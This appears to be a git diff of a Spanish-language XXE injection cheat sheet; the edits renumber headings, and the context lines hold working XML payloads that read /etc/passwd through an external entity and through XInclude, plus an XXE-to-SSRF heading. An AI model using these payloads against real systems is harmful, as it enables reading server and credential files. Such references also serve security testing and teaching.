@@ -18,7 +18,7 @@ Algo metodos de inyectar una XXE.
 5. [Out-Of-Band](#OutOFBand)
 
 ### 1- XXE payloads <a name="XXEpayloads"></a>
-**LFI Test**
+**1.1- LFI Test**
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
@@ -26,7 +26,7 @@ Algo metodos de inyectar una XXE.
 ```
 ---
 ### 2- XXE a SSRF <a name="XXEaSSRF"></a>
-**Viendo archivos de un servidor interno**
+**2.1- Viendo archivos de un servidor interno**
 
 ```xml
 <?xml version="1.0"?>
@@ -40,6 +40,7 @@ Algo metodos de inyectar una XXE.
 
 ### 3- XXE blind en peticion <a name="BlindXXE"></a>
 **3.1- Ver si existe una XXE sin que se vea en la peticion**
+
 Una forma de identificar una XML blind en una petición: Si la aplicación incrusta los datos enviados en un documento XML y luego se analiza el documento como pasa en una solicitud SOAP de backend. Podemos probar a inyectar XInclude que es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos, Ej:
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
